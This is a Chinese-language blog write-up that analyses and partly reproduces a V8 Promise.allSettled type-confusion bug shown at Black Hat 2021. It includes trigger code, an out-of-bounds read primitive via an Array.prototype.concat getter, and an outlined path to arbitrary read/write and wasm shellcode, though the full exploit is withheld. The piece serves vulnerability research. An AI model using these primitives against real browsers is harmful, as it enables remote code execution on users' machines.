这是21年bh上的一次议题分享中的漏洞，视频还未公开，但是看了slide后不禁被这绝妙的思路所折服，于是决定自己亲手构造一番，在此感谢@__R0ng的指导

slide可以在[这里](https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Typhoon-Mangkhut-One-Click-Remote-Universal-Root-Formed-With-Two-Vulnerabilities.pdf)找到，另外虽然是20年的漏洞，但是issue页面到现在也未公开

![image-20210813153642859](https://image.3001.net/images/20211029/1635508477_617be0fd633ee8d3f1318.png!small)

有关的两次commit在这里，[commit1](https://chromium.googlesource.com/v8/v8/+/26df3fdc2521788c4fb3c8c4b5a78f5dada8ab20)|[commit2](https://chromium.googlesource.com/v8/v8/+/4c3cc31cfcd150d0c1db5e4229e6f90a9aef273b)

## 漏洞分析

整体是关于`Promise.allSettled`的错误，所以先看下有关内容

### 关于Promise

`Promise`对象用于表示一个异步操作的最终完成
(或失败)及其结果值，具体可以看[这里](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise)

`Promise`有以下三种状态：

  * 待定（pending）: 初始状态，既没有被兑现，也没有被拒绝

  * 已兑现（fulfilled）: 意味着操作成功完成

  * 已拒绝（rejected）: 意味着操作失败

待定状态的 Promise
对象要么会通过一个值被兑现（fulfilled），要么会通过一个原因（错误）被拒绝（rejected）。当这些情况之一发生时，我们用 promise 的
then 方法排列起来的相关处理程序就会被调用。

`Promise.allSettled()`方法返回一个在所有给定的promise都已经`fulfilled`或`rejected`后的promise，并带有一个对象数组，每个对象表示对应的promise结果

### 关于Promise.allSettled()

`Promise.allSettled()`方法返回一个在所有给定的promise都已经`fulfilled`或`rejected`后的promise，并带有一个对象数组，每个对象表示对应的promise结果
详细的可以看[这里](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise/allSettled)

    
    
    // 用法
    Promise.allSettled(iterable);
    // iterable就是字面意思，一个可迭代对象
    

示例

    
    
    Promise.allSettled([
      Promise.resolve(1),
      Promise.reject(2)
    ])
    .then((results) => results.forEach((result) => console.log(result.status)));
    // output:
    // fulfilled
    // rejected
    

重点是，只有传入的所有promise对象都已经`fulfilled`或`rejected`后才会返回一个array

### Bug

我们来看下`Promise.allSettled`的对应实现，源码在`src/builtins/promise-all-element-closure.tq`中

    
    
    transitioning macro PromiseAllResolveElementClosure<F: type>(
        implicit context: Context)(
        value: JSAny, function: JSFunction, wrapResultFunctor: F): JSAny {
    
    [ ... ]
      const index = identityHash - 1;
    
      let remainingElementsCount = UnsafeCast<Smi>(
          context.elements[PromiseAllResolveElementContextSlots::
                               kPromiseAllResolveElementRemainingSlot]);
    
      let values = UnsafeCast<FixedArray>(
          context.elements[PromiseAllResolveElementContextSlots::
                               kPromiseAllResolveElementValuesSlot]);
      const newCapacity = index + 1;
      if (newCapacity > values.length_intptr) deferred {
          // This happens only when the promises are resolved during iteration.
          values = ExtractFixedArray(values, 0, values.length_intptr, newCapacity);
          context.elements[PromiseAllResolveElementContextSlots::
                               kPromiseAllResolveElementValuesSlot] = values;
        }
      values.objects[index] = updatedValue;
    
      remainingElementsCount = remainingElementsCount - 1;  //减1
      context.elements[PromiseAllResolveElementContextSlots::
                           kPromiseAllResolveElementRemainingSlot] =
          remainingElementsCount;
      if (remainingElementsCount == 0) {										//为0
        const capability = UnsafeCast<PromiseCapability>(
            context.elements[PromiseAllResolveElementContextSlots::
                                 kPromiseAllResolveElementCapabilitySlot]);
        const resolve = UnsafeCast<JSAny>(capability.resolve);
        const arrayMap = UnsafeCast<Map>(
            nativeContext
                .elements[NativeContextSlot::JS_ARRAY_PACKED_ELEMENTS_MAP_INDEX]);
        const valuesArray = NewJSArray(arrayMap, values);
        Call(context, resolve, Undefined, valuesArray);   //返回array
      }
      return Undefined;
    }
    

对于`.tq`后缀的文件是v8中的turque，详细信息请看v8的[官方文档](https://v8.dev/docs/torque)，关于其概念不在讲解，不影响我们理解漏洞

通过注释我们可以得知，在其内部实现中有`remainingElementsCount`这么一个变量，在每调用一次`PromiseAllResolveElementClosure`时，都会将其减1，而其初始化时，就是传入`allSettled`内的可迭代对象长度，当等于0时就会返回一个array

那么如果我们在一个对象上既调用`resolveElementFun`也调用
`rejectElementFun`呢，这就会导致虽然只对一个对象进行了处理，但是`remainingElementsCount`却减去2，最终我们只需将半数可迭代对象内部的内容给处理掉之后就能得到array

所以我们可以先一步拿到返回的array，然而settled的过程 **仍在继续**
，这点可以通过调试得知，后面在remainingElementsCount等于0后会继续减为负数

我们拿到array之后，可以改变array的map，从而在其之后的settled过程中达到类型混淆，比如我们可以将array从`FixedArray`类型变为`NumberDictionary`，如此一来最直观的一点就是

![image-20210816141029703](https://image.3001.net/images/20211029/1635508479_617be0ff58fc2641db677.png!small)

可以看到仍按照未变类型之前的偏移去读写数据的话就会造成越界读写，这也是在消去checkmaps之后常用的越界手段

类型转化的方法有slide上贴出的，`arr[0x10000] =
1`，原因是对于FixedArray来说，其内嵌的对象数量有一定的限制，超过这个限制就会自然转化为NumberDictionary形式，同样也是为了节省空间的优化表现形式

  * befer ![image-20210816144710493](https://image.3001.net/images/20211029/1635508480_617be100f302f5ae5dfc8.png!small)

  * after ![image-20210816144730128](https://image.3001.net/images/20211029/1635508483_617be1030a03ff417339f.png!small)

再来看一下内存布局

为了方便展示我用了`arr = [1.1,2.2,3.3];`

  * before ![image-20210816145956264](https://image.3001.net/images/20211029/1635508484_617be104c446b801b353a.png!small)

  * after

    * 首先可以看到他的排布顺序也变了  
![image-20210816150205900](https://image.3001.net/images/20211029/1635508486_617be1068169b52e19390.png!small)

    * ![image-20210816150802486](https://image.3001.net/images/20211029/1635508488_617be1080b79b0baf5e55.png!small)

可以看到布局改变很大，由于压缩指针的原因，指针排布比较紧密，就没有在图中标注释，但是仔细点可以看到从0x2c0e080c8214+8开始就是右key，左value的布局了

### 如何触发

前面也说了，只要对于一个迭代对象内的每个promise都一起调用俩函数resolveElementFun 和
rejectElementFun那么就能提前得到array，但是似乎还不知道具体怎么做

作者在slide中给了一段poc作为示范

    
    
    class MyCls{
      constructor(executor){
        executor(custom_resolve,custom_reject);
      }
      static resolve(){
        return{
          then:(fulfill, reject)=>{
            fulfill(); reject();
          }
        }
      }
    }
    

## 源码分析

经调试发现对于`remainingElementsCount`的初始化在`promise-all.tq`里面，设置为n+1后，后面会减1

    
    
    // ES#sec-promise.allsettled
    // Promise.allSettled ( iterable )
    transitioning javascript builtin PromiseAllSettled(
        js-implicit context: Context, receiver: JSAny)(iterable: JSAny): JSAny {
      return GeneratePromiseAll(  //================================调用GeneratePromiseAll
          receiver, iterable, PromiseAllSettledResolveElementFunctor{},
          PromiseAllSettledRejectElementFunctor{});
    }
    ==============================================================================
    transitioning macro GeneratePromiseAll<F1: type, F2: type>(
        implicit context: Context)(
        receiver: JSAny, iterable: JSAny, createResolveElementFunctor: F1,
        createRejectElementFunctor: F2): JSAny {
    [ ... ]
      try {
        // Let iterator be GetIterator(iterable).
        // IfAbruptRejectPromise(iterator, promiseCapability).
        let i = iterator::GetIterator(iterable);
    
        // Let result be PerformPromiseAll(iteratorRecord, C,
        // promiseCapability). If result is an abrupt completion, then
        //   If iteratorRecord.[[Done]] is false, let result be
        //       IteratorClose(iterator, result).
        //    IfAbruptRejectPromise(result, promiseCapability).
        return PerformPromiseAll(        //=========================调用PerformPromiseAll
            receiver, capability, i, createResolveElementFunctor,
            createRejectElementFunctor) otherwise Reject;
    [ ... ]
    ===============================================================================
    transitioning macro PerformPromiseAll<F1: type, F2: type>(
        implicit context: Context)(
        constructor: JSReceiver, capability: PromiseCapability,
        iter: iterator::IteratorRecord, createResolveElementFunctor: F1,
        createRejectElementFunctor: F2): JSAny labels
    Reject(Object) {
      const nativeContext = LoadNativeContext(context);
      const promise = capability.promise;
      const resolve = capability.resolve;
      const reject = capability.reject;
    [ ... ]
      const resolveElementContext =
          CreatePromiseAllResolveElementContext(capability, nativeContext);
    
      let index: Smi = 1;
    [ ... ]
    
      // Set iteratorRecord.[[Done]] to true.
      // Set remainingElementsCount.[[Value]] to
      //    remainingElementsCount.[[Value]] - 1.
      let remainingElementsCount = UnsafeCast<Smi>(
          resolveElementContext[PromiseAllResolveElementContextSlots::
                                    kPromiseAllResolveElementRemainingSlot]);
      remainingElementsCount -= 1;
      resolveElementContext[PromiseAllResolveElementContextSlots::
                                kPromiseAllResolveElementRemainingSlot] =
          remainingElementsCount;
      if (remainingElementsCount > 0) {
        // Pre-allocate the backing store for the {values_array} to the desired
        // capacity here. We may already have elements here in case of some
        // fancy Thenable that calls the resolve callback immediately, so we need
        // to handle that correctly here.
        const valuesArray = UnsafeCast<JSArray>(
            resolveElementContext[PromiseAllResolveElementContextSlots::
                                      kPromiseAllResolveElementValuesArraySlot]);
        const oldElements = UnsafeCast<FixedArray>(valuesArray.elements);
        const oldCapacity = oldElements.length_intptr;
        const newCapacity = SmiUntag(index);
        if (oldCapacity < newCapacity) {
          valuesArray.elements =
              ExtractFixedArray(oldElements, 0, oldCapacity, newCapacity);
        }
      } else
        deferred {
          // If remainingElementsCount.[[Value]] is 0, then
          //     Let valuesArray be CreateArrayFromList(values).
          //     Perform ? Call(resultCapability.[[Resolve]], undefined,
          //                    « valuesArray »).
          assert(remainingElementsCount == 0);
          const valuesArray = UnsafeCast<JSAny>(
              resolveElementContext[PromiseAllResolveElementContextSlots::
                                        kPromiseAllResolveElementValuesArraySlot]);
          Call(nativeContext, UnsafeCast<JSAny>(resolve), Undefined, valuesArray);
        }
      //Print("WTF!");
      // Return resultCapability.[[Promise]].
      return promise;
    }
    

`PerformPromiseAll`的代码比较长，是对传入的参数进行迭代，并对其中的每一个元素都调用了`promiseResolve`，具体的可以看看源码，最后的`Promise.allSettled`的返回值那个promise是这里返回的，而那个array是`promise-all-element-closure.tq `中处理的

    
    
    transitioning macro PromiseAllResolveElementClosure<F: type>(
        implicit context: Context)(
        value: JSAny, function: JSFunction, wrapResultFunctor: F): JSAny {
    [ ... ]
    
      // Update the value depending on whether Promise.all or
      // Promise.allSettled is called.
      const updatedValue = wrapResultFunctor.Call(nativeContext, value);
      // Determine the index from the {function}.
    
      // Check if we need to grow the [[ValuesArray]] to store {value} at {index}.
      const valuesArray = UnsafeCast<JSArray>(
          context[PromiseAllResolveElementContextSlots::
                      kPromiseAllResolveElementValuesArraySlot]);
      const elements = UnsafeCast<FixedArray>(valuesArray.elements);
      const valuesLength = Convert<intptr>(valuesArray.length);
      if (index < valuesLength) {
      //Print('1');
        // The {index} is in bounds of the {values_array},
        // just store the {value} and continue.
        elements.objects[index] = updatedValue;//将对应promisefulfilled或reject后的返回值写入array
      } else {
      //Print('2');
        // Check if we need to grow the backing store.
        const newLength = index + 1;
        const elementsLength = elements.length_intptr;
        if (index < elementsLength) {
          // The {index} is within bounds of the {elements} backing store, so
          // just store the {value} and update the "length" of the {values_array}.
          valuesArray.length = Convert<Smi>(newLength);
          elements.objects[index] = updatedValue;//将对应promisefulfilled或reject后的返回值写入array
        } else
          deferred {
          //Print('3');
            // We need to grow the backing store to fit the {index} as well.
            const newElementsLength = IntPtrMin(
                CalculateNewElementsCapacity(newLength),
                kPropertyArrayHashFieldMax + 1);
            assert(index < newElementsLength);
            assert(elementsLength < newElementsLength);
            const newElements =
                ExtractFixedArray(elements, 0, elementsLength, newElementsLength);
            newElements.objects[index] = updatedValue;
    
            // Update backing store and "length" on {values_array}.
            valuesArray.elements = newElements;
            valuesArray.length = Convert<Smi>(newLength);
          }
      }
      let remainingElementsCount =
          UnsafeCast<Smi>(context[PromiseAllResolveElementContextSlots::
                                      kPromiseAllResolveElementRemainingSlot]);
      remainingElementsCount = remainingElementsCount - 1;
      //Print('remainingElementsCount in all-element ',remainingElementsCount);
      context[PromiseAllResolveElementContextSlots::
                  kPromiseAllResolveElementRemainingSlot] = remainingElementsCount;
      if (remainingElementsCount == 0) {   //当remainingElementsCount为0时返回array
      //Print('return array');
        const capability = UnsafeCast<PromiseCapability>(
            context[PromiseAllResolveElementContextSlots::
                        kPromiseAllResolveElementCapabilitySlot]);
        const resolve = UnsafeCast<JSAny>(capability.resolve);
        Call(context, resolve, Undefined, valuesArray);   //返回array
      }
      return Undefined;
    }
    

## 一些细节

### 0

关于poc，我们声明完上面的class之后，用Reflect来调用`allsettled`，这样就能传入`MyCls`了，我初步写的，其中的reflect是重点，要说明的是这里对于reflect的用法和我的最终版本有些差别，不过我思路写的足够详细，各位可以自己动手尝试

    
    
    class MyCls{
      constructor(executor){
        executor(custom_resolve,custom_reject);
      }
      static resolve(){
        return{
          then:(fulfill, reject)=>{
            console.log("call fulfill");
            fulfill();
            console.log("call reject");
            reject();
          }
        }
      }
    }
    
    // var arr = Reflect.construcst(MyCls,[function (reject,resolve){resolve()}],Promise);
    var arr = Promise.allSettled([Reflect.apply(MyCls.resolve,Promise,[1])]);
    

![image-20210817152252994](https://image.3001.net/images/20211029/1635508489_617be10991dbb55d11ca0.png!small)

### 1

![image-20210816165234312](https://image.3001.net/images/20211029/1635508491_617be10b35b2b5591c53d.png!small)

这里直接认为是`FixedArray`，从而按原来的偏移取值，并且长度是按在`arrayObj`里的len处取的，这点我认为倒是无关紧要，因为不论是大于还是小于，后面都会将对应的updatedvalue写入

### 2

![image-20210816165654973](https://image.3001.net/images/20211029/1635508492_617be10c9210c37733009.png!small)

我们能写进去的只能是object的地址显然最后一位都是1，因此有些debug下的检查会导致abort，需要手动注释，另外我们不能像下面这样

    
    
    Promise.allSettled(b)
    .then(arr => {
       arr[0x10000] = 1;
       %DebugPrint(arr);
     });
    

来改变返回的arr的map，因为这里的then其实是对allSettled的返回的Promise的操作，而这个Promise是allSettled完成之后才会返回的，所以在这里并不能接收到提前返回的arr，我们应该在custom_resolve中更改arr，因为这里我们才可以接收到提前返回的arr

    
    
    function custom_resolve(arr){
      console.log("custom_resolve called");
      arr[0x10000] = 1;
      // %DebugPrint(arr);
    }
    function custom_reject(){
      console.log("custom_reject called");
    }
    class MyCls{
      constructor(executor){
        executor(custom_resolve,custom_reject);
      }
      static resolve(){
        return{
          then:(fulfill, reject)=>{
            fulfill();
            reject();
          }
        }
      }
    }
    let ss = Reflect.apply(MyCls.resolve,Promise,[2])
    let b = [ss,ss,ss,ss];
    // var arr = Reflect.construcst(MyCls,[function (reject,resolve){resolve()}],Promise);
    Reflect.apply(Promise.allSettled,MyCls,[b])
    // Promise.allSettled(b)
    // .then(arr => {
    //   arr[0x10000] = 1;
    //   %DebugPrint(arr);
    // });
    

![image-20210819150946878](https://image.3001.net/images/20211029/1635508494_617be10e5e31ce457bc90.png!small)

可以看到这里assert没过去

    
    
    macro UnsafeCast<A : type extends Object>(implicit context: Context)(o: Object):
        A {
      //Print(o);
      assert(Is<A>(o));
      return %RawDownCast<A>(o);
    }
    

这个assert只有在debug版本下才有，如同DCHECK，所以为了调试将assert去掉，除此之外还有很多检查，只要是只有debug版本才有的都可以注释掉

在越界写后，导致一些信息被修改，最后无法寻址arr的相关信息，一旦print等操作就会crash，应该是写到了错误的地方导致的，我们应该仔细看下对应的内存布局

  * FixedArray  
![1.jpeg](https://image.3001.net/images/20211029/1635507879_617bdea70584e0d15fb58.jpeg!small)

  * NumberDictionary

![2.jpeg](https://image.3001.net/images/20211029/1635507903_617bdebf637afb3dd3fb6.jpeg!small)

还可以对照下面的图来看这个布局，经观察发现是在deleted字段中写入了一个obj地址，导致在print时一直向后访问最终访问到非法地址导致crash，我们需要控制一下，在我上面写的版本中只有在写入第1/2和最后一个promise时才会调用custom_resolve，我们在第一二次时将其改为NumberDictionary会写到delete字段

所以我们不能在resolve里改，联系到我们可以在resolve中提前得到array，通过一个全局变量把arr取出来，就能实现任意时刻我们都可以改，那么剩下的就是需要在别处设计一个定时，从而在确定时机完成修改，我选择在reject和fulfilled处加上count，在对应的调用次数时再修改

### 3

![image-20210816170210377](https://image.3001.net/images/20211029/1635508496_617be110996ffdb6709d2.png!small)

在`NumberDictionary`中有个元数据用得到最后一位，当`MaxNumberKey`最后一位为1时，意味着没有特殊元素，而其本身表示最大有效索引，但是因为其并不代表length，所以无论我们将其覆盖成多大的值都无法得到一个越界数组，但是它的另一个含义为我们带来的别的思路，最后一位映射的特殊元素包括get

    
    
    let arr = []
    arr[0x10000] = 1
    Object.defineProperty(arr, 0, {
      get : () => {
        console.log("getter called")
        return 1
      }
    })
    

如果我们给他声明了一个get操作，但之后又用obj的地址将`MaxNumberKey`最后一位覆盖，那么在进入`IterateElements`中的判断时会误认为没有get操作，从而在其后的回调中改变len得以成功，于是会越界读取，此`IterateElement`是下面的一个内置函数中的内容，我们可以看下有get这个特殊元素的布局为

![image-20210823165458256](https://image.3001.net/images/20211029/1635508498_617be112c325fc64b7034.png!small)

正常情况下是

![image-20210823165601990](https://image.3001.net/images/20211029/1635508501_617be1158a5d99ecb5e8e.png!small)

### 4

把目光放向内置函数，有一个能帮助我们越界读的内置函数

![image-20210816171217841](https://image.3001.net/images/20211029/1635508504_617be11851fb945df6d42.png!small)

`Array.prototype.concat`是array的一个内置函数，是用来合并两个array的，所以在这个过程中会对数组中的数据进行遍历，我们并不是为了让俩数组合并才用的这个调用，单纯是利用这里可以助我们越界读，所以我们可以利用concat中的回调，在其中改变数组长度，比如原本0x200的buffer我们在concat的回调中将其改为0x10，如此一来，就会把越界读取的数据全存在返回的数组里

左边的标号和右边的源码是对应着的，首先我们前面的写`MaxNumberKey`，使得能bypass这里的`HasOnlySimpleElements`检查，然后在循环迭代时，先走下面的else分支，触发`GetElement`回调，从而改变len

    
    
    Object.defineProperty(oob_arr, 0, {
        get : () => {
          print("=== getter called ===");
          victim_arr.length = 0x10;   // 在回调函数中修改数组长度
          gc();
          return 1;
        }
    });
    
    let a = oob_arr.concat(victim_arr);
    

![image-20210823160657629](https://image.3001.net/images/20211029/1635508506_617be11a45f720768d4f6.png!small)

});

### 5

![image-20210816171712118](https://image.3001.net/images/20211029/1635508507_617be11b7ae624fa0874c.png!small)

### 剩下的思路

  * 通过越界读，也就是通过前面的concat返回的数组，搜索出一个arrayBuffer的backing store地址，这点上面有提到，可以通过一些标记值减去相应偏移获得

  * 在这个ArrayBuffer里面伪造一个假的double Array，通过在arraybuffer里面布局达到，此时这个double array的地址也是已知

  * 通过越界读，可以得到这个伪造array的引用，具体来说就是因为有`arrayBuffer`的`backing store`地址，所以我们可以得到fake array的地址，然后我们将这个地址以浮点数形式写在内存中，触发越界读，这样读取到这个地址时将越界读到的值返回给一个变量，这个变量就能直接操控fake array，从而得到fake array的引用，这里我觉得是最妙的一点

  * 通过这个给fake array的赋值，以及从oob array处读取，以及从oob array处对其赋值，可以完成arb r/w

  * 写shellcode到wasm里，并调用

这里剩下的就是调偏移布局让读到arraybuffer，体力活，不再展示，由于一些原因，构造poc的过程代码和完成代码就都不贴了，看完以上应该可以自己构造出来

以上就是对这次21年bh上一个绝妙的利用手法的分析复现

以上就是关于今年bh上的一个绝妙利用手法的复现分析

## 参考

https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Typhoon-Mangkhut-One-Click-Remote-Universal-Root-Formed-With-Two-Vulnerabilities.pdf  
https://vul.360.net/archives/144 （这是漏洞作者本人的记录）

